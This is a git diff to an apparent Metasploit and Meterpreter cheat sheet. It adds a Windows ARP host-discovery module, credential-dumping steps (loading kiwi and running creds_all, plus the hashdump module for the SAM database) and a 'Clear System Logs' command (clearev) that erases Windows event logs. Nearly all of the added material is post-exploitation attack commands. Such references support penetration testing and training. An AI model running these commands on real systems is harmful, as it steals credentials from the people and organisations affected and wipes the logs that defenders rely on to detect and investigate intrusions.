@@ -106,7 +106,9 @@ meterpreter > ifconfig
 arp -a
 
 use auxiliary/scanner/discovery/arp_sweep
-
+```
+##### Host Discovery (Windows)
+```bash
 use post/windows/gather/arp_scanner
 ```
 
@@ -125,13 +127,19 @@ run
 migrate -N <Process Name>.<Extension>
 ```
 
-### Dump Clear Text Credentials and Hashes
+### Get Windows Credentials
+##### Dump Clear Text Credentials and Hashes
 ```bash
 sessions -i <Session #>
 load kiwi
 help
 creds_all
 ```
+##### Dump the contents of the SAM database
+```bash
+use post/windows/gather/hashdump
+```
+
 ### Port Forwarding
 ##### portfwd
 | Flag | Description |
@@ -157,6 +165,12 @@ set LOCAL_ADDRESS <Local IP for Listening>
 set LOCAL_PORT  <Local Port for Listening>
 set SESSION <Session #>
 run
+```
+
+### Windows Commands
+##### Clear System Logs
+```bash
+meterpreter > clearev
 ```
 
 # msfvenom
